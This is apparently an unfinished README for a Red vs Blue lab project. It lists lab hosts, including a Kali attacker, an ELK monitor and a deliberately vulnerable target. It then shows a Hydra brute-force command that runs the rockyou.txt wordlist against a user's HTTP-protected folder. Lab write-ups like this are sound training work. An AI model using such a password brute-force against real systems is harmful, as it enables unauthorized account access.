<p align="center">
  <img src="https://github.com/wevertonribeiroferreira/Red-vs-Blue-Project/blob/main/Images/logo.png?raw=true" alt="Sublime's custom image"/>
</p>

# Preface


# Network Topology

<p align="center">
  <img src="https://github.com/wevertonribeiroferreira/Red-vs-Blue-Project/blob/main/Images/map.png?raw=true" alt="Sublime's custom image"/>
</p>


text

# **Red Team** 
## Security Assessment

### Recon: Describing the Target
Nmap identified the following hosts on the network:

| Hostname                              | IP Address    | Role on Network                                |
|---------------------------------------|---------------|------------------------------------------------|
| Hyper-V Azure machine ML-RefVm-684427 | 192.168.1.1   | Host Machine Cloud based                       |
| Kali                                  | 192.168.1.90  | Attacking Machine                              |
| ELK Stack                             | 192.168.1.100 | Network Monitoring Machine running Kibana      |
| Capstone                              | 192.168.1.105 | Target Machine Replicating a vulnerable server |


# Vulnerability Assessment
##The assessment uncovered the following critical vulnerabilities in the target:

# Exploitation: **Brute Force Password**

**Tools & Processes**

I used Hydra which is already preinstalled on Kali Linux. I also required a password list – in this case I used rockyou.txt

**Command**: $ hydra -l ashton -P /root/Downloads/rockyou.txt -s 80 -f 192.168.1.105 http-get /company_folders/secret_folder

**Achievements**
